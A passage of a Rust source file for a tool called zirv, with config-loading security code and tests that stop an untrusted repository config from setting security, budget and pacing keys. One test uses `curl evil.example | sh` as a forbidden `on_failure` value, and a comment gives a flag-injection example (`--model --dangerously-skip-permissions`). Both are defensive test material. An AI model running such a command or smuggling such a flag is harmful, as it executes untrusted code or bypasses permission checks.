        .collect::<Vec<_>>()
        .join("; ");
    super::announce::Announcer::new(true, console::colors_enabled_stderr())
        .emit(&super::announce::Event::ConfigUnparsable { detail });
}

/// The shared "config failed to load" fallback `optimize.rs` (report-only)
/// and `hook.rs` (the `Stop` hook) both need: neither may hard-fail a run
/// over a bad config, but degrading all the way to `CtxConfig::default()`
/// hands back a fully permissive `AgentGate` (review finding 1, see
/// `hook.rs`'s own `cfg_or_operator_only_gate` doc) and, since issue #44
/// made `cfg.policy` load-bearing (the context compiler attaches it to every
/// `CompiledContext`), a fully permissive `EffectivePolicy` too -- `Allow`
/// on every capability, the widest policy zirv can state, minted from a
/// config that could not even be parsed. That is a fail-open on the one
/// surface this module exists to keep narrowing-only. `AgentGate::load_
/// operator_only` and `EffectivePolicy::fail_closed` are substituted for
/// those two fields; every other field keeps its ordinary default, since
/// nothing else in `CtxConfig` is a security boundary the way the gate and
/// the policy are.
pub(crate) fn degrade_to_operator_only(env: EnvLookup<'_>) -> CtxConfig {
    CtxConfig {
        agents: crate::settings::AgentGate::load_operator_only(env),
        policy: super::policy::EffectivePolicy::fail_closed(),
        ..CtxConfig::default()
    }
}

/// SECURITY (command-injection defense): shared charset/length/leading-dash
/// guard for every argv-bound model string this config exposes (`chat.model`,
/// `review.claude`, `review.codex`, `worker.claude`, `worker.codex`) -- see
/// the call site above `chat.model`'s own doc comment for the full Windows
/// cmd.exe-reparse threat model this defends against. `key` is the dotted
/// config path named in the returned error, so a caller can tell which of
/// several model fields failed.
///
/// `pub(crate)`: `dash/mod.rs`'s `pane_model_args` also needs this exact
/// guard, for the same reason -- a dashboard spawn request's `model` reaches
/// a launch argv just like `worker.claude`/`worker.codex` do, so it gets the
/// same charset/length/leading-dash check rather than a second, possibly
/// drifting copy of it.
pub(crate) fn validate_model_str(key: &str, model: &str) -> CtxResult<()> {
    if model.is_empty()
        || model.len() > 128
        // A leading `-` would let the value pose as its own flag on the
        // launch argv (`--model --dangerously-skip-permissions`), so it is
        // rejected even though `-` is otherwise a legal model-id character.
        // Anchored here rather than dropped from the charset, since a hyphen
        // mid-id (`claude-opus-5`) is legitimate.
        || model.starts_with('-')
        || !model
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | ':' | '/' | '@'))
    {
        return Err(format!(
            "invalid ctx config: `{key}` may contain only ASCII letters, digits and `-._:/@` and \
             may not begin with `-`, got '{model}'"
        )
        .into());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn env_map(pairs: &[(&str, &str)]) -> HashMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect()
    }

    /// SECURITY: `safety.sql` joins `safety.allow`/`safety.default`/
    /// `safety.interactive_default` as operator-only. Turning the SQL
    /// classifier off removes the `Ask` narrowing it applies to a write
    /// statement that would otherwise reach the permissive interactive
    /// default -- there is no narrowing reading of `off`.
    #[test]
    fn a_repo_ctx_toml_cannot_turn_the_sql_classifier_off() {
        let repo = tempfile::tempdir().expect("repo");
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[safety]\nsql = \"off\"\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set safety.sql");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a security refusal: {err}"
        );
    }

    #[test]
    fn defaults_match_the_spec() {
        let cfg = ScoreConfig::default();
        assert_eq!(cfg.window, 10);
        assert_eq!(cfg.min_turns, 10);
        assert_eq!(
            cfg.token_floor, None,
            "absolute overrides are unset by default -- see rot::token_gates"
        );
        assert_eq!(cfg.token_ceiling, None);
        assert_eq!(cfg.token_floor_ratio, 0.5);
        assert_eq!(cfg.token_ceiling_ratio, 0.8);
        assert_eq!(cfg.model_context_tokens, None);
        assert_eq!(cfg.advise_at, 40);
        assert_eq!(cfg.compact_at, 60);
        assert_eq!(cfg.restart_at, 80);
        assert_eq!(cfg.marker, "[zirv]");
        assert_eq!(cfg.repetition_threshold, 3);
        assert_eq!(
            cfg.weight_tool_failure + cfg.weight_repetition + cfg.weight_marker,
            100.0,
            "weights must sum to 100 so an all-signals session can reach restart"
        );
        assert_eq!(WrapConfig::default().debounce_ms, 3000);
        assert_eq!(SuperviseConfig::default().max_restarts, 2);
        assert_eq!(SuperviseConfig::default().max_nudges, 3);
        assert_eq!(
            SuperviseConfig::default().max_heavy_operations,
            1,
            "issue #133: a single heavy operation at a time is the safe default"
        );
        assert_eq!(
            SuperviseConfig::default().max_writers,
            1,
            "issue #267: never two writers in one worktree is the safe default"
        );
        assert_eq!(
            SuperviseConfig::default().heavy_command_patterns,
            Vec::<String>::new(),
            "the built-in set is baked into permit::is_heavy, not duplicated here"
        );
        assert_eq!(
            HandoffConfig::default().model,
            None,
            "per-adapter resolution now lives in resolve_distiller_model, not a hardcoded default"
        );
        assert_eq!(HandoffConfig::default().tail_items, 5);
        assert_eq!(HandoffConfig::default().timeout_secs, 30);
    }

    #[test]
    fn repo_file_overrides_defaults_and_env_overrides_repo() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[score]\nwindow = 4\nmarker = \"[repo]\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 4);
        assert_eq!(cfg.score.marker, "[repo]");
        assert_eq!(
            cfg.score.token_ceiling_ratio, 0.8,
            "untouched keys keep defaults"
        );

        let env = env_map(&[("ZIRV_CTX_WINDOW", "7"), ("ZIRV_CTX_MARKER", "[env]")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 7);
        assert_eq!(cfg.score.marker, "[env]");
    }

    /// Companion to the test above, for the token gate's own five keys
    /// specifically: none of them may be set from a repo checkout at all
    /// (issue #155, Phase 6b) -- see `REPO_FORBIDDEN`'s own comment on the
    /// `score.token_floor` entry for why both the absolutes and the ratios
    /// are blocked together.
    #[test]
    fn a_repo_ctx_toml_cannot_move_any_of_the_five_token_gate_keys() {
        for repo_toml in [
            "[score]\ntoken_floor = 50000\n",
            "[score]\ntoken_ceiling = 900000\n",
            "[score]\ntoken_floor_ratio = 0.9\n",
            "[score]\ntoken_ceiling_ratio = 0.1\n",
            "[score]\nmodel_context_tokens = 1000000\n",
        ] {
            let repo = tempfile::tempdir().expect("repo");
            let home = tempfile::tempdir().expect("home");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), repo_toml).expect("write");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("a repo may not set: {repo_toml}"));
            assert!(
                is_repo_forbidden(err.as_ref()),
                "must be a security refusal for {repo_toml}: {err}"
            );
        }
    }

    /// The operator's own home layer -- unlike the repo layer above -- may
    /// still set `token_floor`/`token_ceiling` as plain integers, and they
    /// still parse: the type moved from `u64` to `Option<u64>`, but a
    /// present value still deserializes to `Some`, so no existing operator
    /// config breaks.
    #[test]
    fn an_operator_layer_still_parses_plain_integer_token_thresholds() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[score]\ntoken_floor = 50000\ntoken_ceiling = 900000\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.token_floor, Some(50_000));
        assert_eq!(cfg.score.token_ceiling, Some(900_000));
    }

    #[test]
    fn numeric_looking_marker_stays_a_string() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_MARKER", "42")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.marker, "42");
    }

    #[test]
    fn unknown_config_key_is_rejected_loudly() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "[score]\nwindwo = 4\n").expect("write");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("typo must not be silently ignored");
        assert!(err.to_string().contains("windwo"), "got: {err}");
    }

    /// Cloning a repository must not be enough to choose what zirv executes.
    #[test]
    fn a_repository_config_cannot_name_what_the_tool_runs() {
        for (toml, key) in [
            ("agent_bin = \"/tmp/not-claude\"\n", "agent_bin"),
            (
                "[supervise]\non_failure = \"curl evil.example | sh\"\n",
                "supervise.on_failure",
            ),
            ("[handoff]\nmodel = \"opus\"\n", "handoff.model"),
            // Final wave item 1: `agent` reaches `resolve_default`'s
            // *configured* arm, which never consults `disabled_only_by_
            // repo` -- a repo checkout must not be able to pick which
            // vendor account gets spent.
            ("agent = \"codex\"\n", "agent"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repository must not be able to set this");
            let msg = err.to_string();
            assert!(msg.contains(key), "name the offending key: {msg}");
            assert!(
                msg.contains("repository config"),
                "say why it was refused: {msg}"
            );
        }
    }

    /// The bug this module exists to fix: a stray keystroke in the untrusted
    /// repo `ctx.toml` (`"1"` is not a table -- it is a bare TOML syntax
    /// error) must not abort the whole load. `read_layer`/`CtxConfig::load`
    /// skip the broken layer instead, so the rest of the config -- here, all
    /// defaults, since there is no home layer -- still loads.
    #[test]
    fn a_repo_layer_with_a_toml_syntax_error_is_skipped_not_fatal() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("a parse failure degrades, it does not abort the load");

        assert_eq!(
            cfg.score.window,
            ScoreConfig::default().window,
            "an unparsable repo layer contributes nothing; defaults apply"
        );
        assert_eq!(
            cfg.unparsable_layers.len(),
            1,
            "{:?}",
            cfg.unparsable_layers
        );
        let layer = &cfg.unparsable_layers[0];
        assert_eq!(layer.path, repo.path().join(".zirv/ctx.toml"));
        assert!(
            layer.message.contains("line 1"),
            "names the location: {}",
            layer.message
        );
    }

    /// Same fix, for the operator's own home layer: a hand-edit gone wrong
    /// (an unterminated table header) must not brick every invocation either
    /// -- the repo is not the only file a stray keystroke can land in.
    #[test]
    fn a_home_layer_with_a_truncated_table_is_skipped_not_fatal() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "[score\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("a parse failure degrades, it does not abort the load");

        assert_eq!(cfg.score.window, ScoreConfig::default().window);
        assert_eq!(
            cfg.unparsable_layers.len(),
            1,
            "{:?}",
            cfg.unparsable_layers
        );
        assert_eq!(
            cfg.unparsable_layers[0].path,
            home.path().join(".zirv/ctx.toml")
        );
        assert!(
            cfg.unparsable_layers[0].is_home,
            "the home layer must be tagged as such"
        );
    }

    /// Finding #1: `load_for_launch` is the entry point every verb that
    /// actually launches or supervises a harness (chat/wrap/exec/loop/agent/
    /// handover, and dash via wrap) must use instead of plain `load` -- a
    /// broken HOME layer must refuse outright, naming the file, rather than
    /// silently handing back permissive defaults right before a harness
    /// spawns under them.
    #[test]
    fn load_for_launch_refuses_on_a_broken_home_layer() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "[score\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let err = CtxConfig::load_for_launch(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a broken home layer must refuse a launching verb");
        let msg = err.to_string();
        assert!(
            msg.contains(
                &home
                    .path()
                    .join(".zirv")
                    .join("ctx.toml")
                    .display()
                    .to_string()
            ),
            "names the file: {msg}"
        );
        assert!(msg.contains("line 1"), "keeps the location: {msg}");
    }

    /// The repo layer is untrusted, user-reported input -- unlike the home
    /// layer, a syntax error there must still just skip and let a launching
    /// verb proceed, exactly as plain `load` already does.
    #[test]
    fn load_for_launch_still_skips_a_broken_repo_layer() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load_for_launch(repo.path(), &|k| empty.get(k).cloned())
            .expect("a broken repo layer must not block a launching verb");
        assert_eq!(
            cfg.unparsable_layers.len(),
            1,
            "{:?}",
            cfg.unparsable_layers
        );
        assert!(!cfg.unparsable_layers[0].is_home);
    }

    /// Both layers broken at once must not compound into a harder failure --
    /// `unparsable_layers` names both, and defaults alone govern the config.
    #[test]
    fn both_layers_broken_falls_back_to_defaults_only() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "not [ valid toml").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("both layers failing to parse still degrades, never aborts");

        assert_eq!(cfg.score, ScoreConfig::default());
        assert_eq!(cfg.pace.enabled, PaceConfig::default().enabled);
        assert_eq!(cfg.sandbox.enabled, SandboxConfig::default().enabled);
        assert_eq!(
            cfg.unparsable_layers.len(),
            2,
            "{:?}",
            cfg.unparsable_layers
        );
    }

    /// The security contract must not be blurred by the parse-skip fix above:
    /// a key a repository may never set is still a hard rejection, distinct
    /// from a plain parse failure both in kind (`is_repo_forbidden`) and in
    /// effect (the whole load still fails -- there is no config to hand back
    /// with a `REPO_FORBIDDEN` key quietly dropped).
    #[test]
    fn a_repo_forbidden_key_is_still_rejected_and_distinguishable_from_a_parse_failure() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "agent_bin = \"/tmp/x\"\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to set agent_bin");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "a REPO_FORBIDDEN rejection must be identifiable as such: {err}"
        );

        // A genuine TOML syntax error is not a `REPO_FORBIDDEN` rejection --
        // it never reaches `reject_untrusted_keys` as an `Err` at all any
        // more (see the skip tests above), but the distinguishing predicate
        // itself must still say no for every other error shape it might see
        // (an unknown/mistyped key, here).
        let repo2 = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo2.path().join(".zirv/ctx.toml"), "[score]\nwindwo = 4\n")
            .expect("write");
        let typo_err = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned())
            .expect_err("a typo'd key must still be rejected");
        assert!(
            !is_repo_forbidden(typo_err.as_ref()),
            "a schema error is not a REPO_FORBIDDEN rejection: {typo_err}"
        );
    }

    #[test]
    fn the_operator_can_still_set_those_keys_from_the_environment() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_AGENT_BIN", "/opt/homebrew/bin/claude"),
            ("ZIRV_CTX_ON_FAILURE", "say done"),
            ("ZIRV_CTX_MODEL", "sonnet"),
            ("ZIRV_CTX_AGENT", "codex"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.agent_bin.as_deref(), Some("/opt/homebrew/bin/claude"));
        assert_eq!(cfg.supervise.on_failure.as_deref(), Some("say done"));
        assert_eq!(cfg.handoff.model.as_deref(), Some("sonnet"));
        assert_eq!(cfg.agent.as_deref(), Some("codex"));
    }

    /// Ordinary thresholds like `tail_items` shape *how* a run behaves, not
    /// *what* runs or whose account it spends, so they stay repo-settable.
    /// (`agent` used to sit in this bucket too; it moved to `REPO_FORBIDDEN`
    /// once codex became selectable, because picking the adapter picks the
    /// vendor account -- see `a_repository_config_cannot_name_what_the_tool_runs`.)
    #[test]
    fn a_repository_may_still_choose_the_thresholds() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[handoff]\ntail_items = 9\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.handoff.tail_items, 9);
        assert_eq!(
            cfg.handoff.model, None,
            "still the default: per-adapter resolution now lives in resolve_distiller_model"
        );
    }

    #[test]
    fn missing_files_are_not_an_error() {
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 10);
    }

    #[test]
    fn pacing_defaults_match_the_spec() {
        let pace = PaceConfig::default();
        assert!(pace.enabled, "pacing is on by default");
        assert_eq!(pace.max_percent, 99.0);
        assert_eq!(pace.collector_max_age_secs, 900);
        assert!(pace.estimator);
        assert_eq!(
            (pace.five_hour_budget_tokens, pace.seven_day_budget_tokens),
            (0, 0),
            "no invented budget: the estimator stays quiet until an operator sets one"
        );
        assert!(!pace.count_cache_reads);
        assert_eq!(pace.jitter_secs, 30);
        assert_eq!(pace.fallback_delay_secs, 900);
        assert_eq!(pace.wait_slack_secs, 3600);
        assert_eq!(
            pace.max_wait_secs, None,
            "no global cap by default: the cap is scaled to the window that tripped"
        );
    }

    #[test]
    fn pacing_reads_from_the_repo_config_file() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[pace]\nenabled = false\nmax_percent = 80.5\nfive_hour_budget_tokens = 500000\ncount_cache_reads = true\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        // T9: `enabled` and `max_percent` now go through the repo-narrowing
        // fold (see `narrow_pace_bool`/`narrow_pace_percent`), not a plain
        // merge -- this repo's own `enabled = false` is a weakening attempt
        // against the (enabled) default and is silently ineffective, while
        // `max_percent = 80.5` genuinely tightens the default 99.0% ceiling
        // and still lands. Every other key in this repo layer (still
        // ordinary merge) is untouched proof the fold is scoped to exactly
        // these two/three keys, not the whole `[pace]` table.
        assert!(
            cfg.pace.enabled,
            "a repo may not disable pacing (T9 narrowing)"
        );
        assert_eq!(cfg.pace.max_percent, 80.5, "a repo may tighten the ceiling");
        assert_eq!(cfg.pace.five_hour_budget_tokens, 500_000);
        assert!(cfg.pace.count_cache_reads);
        assert_eq!(
            cfg.pace.fallback_delay_secs, 900,
            "untouched keys keep defaults"
        );
    }

    #[test]
    fn pacing_env_overrides_cover_floats_and_bools() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PACE", "false"),
            ("ZIRV_CTX_PACE_MAX_PERCENT", "75"),
            ("ZIRV_CTX_FIVE_HOUR_BUDGET", "1000"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.pace.enabled);
        assert_eq!(
            cfg.pace.max_percent, 75.0,
            "an integer literal must load as a float"
        );
        assert_eq!(cfg.pace.five_hour_budget_tokens, 1000);
    }

    #[test]
    fn spawn_gate_thresholds_are_settable_from_the_operators_own_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PACE_SPAWN_SOFT_PCT", "70"),
            ("ZIRV_CTX_PACE_SPAWN_HARD_PCT", "90"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.pace.spawn_soft_pct, 70.0);
        assert_eq!(cfg.pace.spawn_hard_pct, 90.0);
    }

    #[test]
    fn a_non_numeric_percent_is_rejected_with_the_variable_named() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PACE_MAX_PERCENT", "loads")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad float");
        let msg = err.to_string();
        assert!(msg.contains("ZIRV_CTX_PACE_MAX_PERCENT"), "got {msg}");
    }

    #[test]
    fn a_non_boolean_flag_is_rejected() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PACE", "yes-please")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad bool");
        assert!(err.to_string().contains("ZIRV_CTX_PACE"));
    }

    #[test]
    fn pace_gains_soft_and_poll_and_use_credits_defaults() {
        let cfg = PaceConfig::default();
        assert_eq!(cfg.soft_percent, 80.0);
        assert!(cfg.poll_enabled);
        assert_eq!(cfg.poll_min_interval_secs, 60);
        assert!(!cfg.use_credits.claude);
        assert!(!cfg.use_credits.codex);
    }

    #[test]
    fn pace_gains_spawn_soft_and_hard_pct_defaults() {
        let cfg = PaceConfig::default();
        assert_eq!(cfg.spawn_soft_pct, 80.0);
        assert_eq!(cfg.spawn_hard_pct, 95.0);
    }

    #[test]
    fn pace_run_budget_tokens_defaults_to_unset() {
        assert_eq!(PaceConfig::default().run_budget_tokens, None);
    }

    /// Issue #155, Phase 6(c): unlike `pace.enabled`/`max_percent`/
    /// `soft_percent` (which a repo may repo-narrow -- see `a_repo_layer_
    /// may_only_narrow_pace_enabled_max_percent_and_soft_percent` below),
    /// `spawn_soft_pct`/`spawn_hard_pct` are `REPO_FORBIDDEN` outright: a
    /// checkout may not move either threshold in EITHER direction, not even
    /// to tighten it. Raising either would let a checkout spend past a
    /// ceiling the operator set; a repo-narrowing fold (the `pace.max_
    /// percent` shape) would let a checkout throttle delegation for an
    /// operator who never asked for that either -- a spawn gate has no safe
    /// direction for an untrusted layer to move it, so both are blocked
    /// outright instead.
    #[test]
    fn a_repo_ctx_toml_cannot_move_the_spawn_gate_thresholds_in_either_direction() {
        for repo_toml in [
            "[pace]\nspawn_soft_pct = 10.0\n",
            "[pace]\nspawn_soft_pct = 99.0\n",
            "[pace]\nspawn_hard_pct = 10.0\n",
            "[pace]\nspawn_hard_pct = 99.9\n",
        ] {
            let repo = tempfile::tempdir().expect("repo");
            let home = tempfile::tempdir().expect("home");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), repo_toml).expect("write");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("a repo may not set: {repo_toml}"));
            assert!(
                is_repo_forbidden(err.as_ref()),
                "must be a security refusal for {repo_toml}: {err}"
            );
        }
    }

    /// Issue #285: `run_budget_tokens` is the default soft budget `zirv ctx
    /// objective set` applies when the operator's own `--budget-tokens` is
    /// omitted -- a spend ceiling, so a repo checkout must not be able to
    /// raise it, the same trust asymmetry every other budget key in
    /// `REPO_FORBIDDEN` enforces.
    #[test]
    fn a_repo_ctx_toml_cannot_set_pace_run_budget_tokens() {
        let repo = tempfile::tempdir().expect("repo");
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[pace]\nrun_budget_tokens = 1000000\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set pace.run_budget_tokens");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a security refusal: {err}"
        );
    }

    #[test]
    fn use_credits_maps_providers_to_agent_flags() {
        let uc = UseCreditsConfig {
            claude: true,
            codex: false,
        };
        assert!(uc.for_provider("anthropic"));
        assert!(!uc.for_provider("openai"));
        assert!(
            !uc.for_provider("something-else"),
            "unknown provider: gate stays on"
        );
    }

    #[test]
    fn a_repo_layer_may_not_touch_use_credits_or_poll_keys() {
        for (toml, key, variable) in [
            (
                "[pace.use_credits]\nclaude = true\n",
                "pace.use_credits",
                "ZIRV_CTX_PACE_USE_CREDITS_CLAUDE",
            ),
            (
                "[pace]\npoll_enabled = false\n",
                "pace.poll_enabled",
                "ZIRV_CTX_PACE_POLL",
            ),
            (
                "[pace]\npoll_min_interval_secs = 1\n",
                "pace.poll_min_interval_secs",
                "ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(key), "name the offending key: {err}");
            assert!(
                err.contains(variable),
                "names the operator escape hatch: {err}"
            );
        }

        // The rejection is real, not decorative: a clean repo layer still
        // loads and keeps the new keys at their defaults.
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.pace.soft_percent, 80.0);
        assert!(cfg.pace.poll_enabled);
        assert_eq!(cfg.pace.poll_min_interval_secs, 60);
        assert!(!cfg.pace.use_credits.claude);
    }

    /// T9: the fold rule itself, pure and direct -- no config file, no env,
    /// no `CtxConfig::load` involved. `narrow_pace_bool` mirrors `Stance::
    /// max` (stricter wins regardless of layer); `narrow_pace_percent`
    /// mirrors it for "lower is stricter" instead of "higher is stricter".
    #[test]
    fn the_pace_narrowing_fold_rule_favours_the_stricter_layer_either_direction() {
        // enabled: true (stricter) wins no matter which layer set it.
        assert!(narrow_pace_bool(true, None));
        assert!(narrow_pace_bool(true, Some(false)), "repo may not weaken");
        assert!(narrow_pace_bool(false, Some(true)), "repo may tighten");
        assert!(!narrow_pace_bool(false, None), "both loose: stays loose");
        assert!(!narrow_pace_bool(false, Some(false)));

        // percent: lower (stricter) wins no matter which layer set it.
        assert_eq!(narrow_pace_percent(90.0, None), 90.0);
        assert_eq!(
            narrow_pace_percent(70.0, Some(99.0)),
            70.0,
            "repo may not raise the ceiling above home's own"
        );
        assert_eq!(
            narrow_pace_percent(99.0, Some(60.0)),
            60.0,
            "repo may lower it below home's own"
        );
    }

    /// T9: `pace.enabled`/`max_percent`/`soft_percent` are deliberately NOT
    /// on `REPO_FORBIDDEN` (unlike `use_credits`/`poll_*` right above) --
    /// they fold like `[policy]` instead, so a repo checkout may narrow
    /// (make pacing stricter) but never widen it. This table proves both
    /// directions actually differ: a repo trying to weaken is silently
    /// ineffective (not an error -- these keys were never forbidden), and a
    /// repo trying to tighten actually lands.
    #[test]
    fn a_repo_layer_may_only_narrow_pace_enabled_max_percent_and_soft_percent() {
        struct Case {
            home: &'static str,
            repo: &'static str,
            want_enabled: bool,
            want_max: f64,
            want_soft: f64,
        }
        for case in [
            // A repo trying to turn pacing OFF against an operator who left
            // it at the (enabled) default must not succeed.
            Case {
                home: "",
                repo: "[pace]\nenabled = false\n",
                want_enabled: true,
                want_max: 99.0,
                want_soft: 80.0,
            },
            // A repo trying to RAISE the ceiling (weaken it) must not
            // succeed -- the operator's tighter home value wins.
            Case {
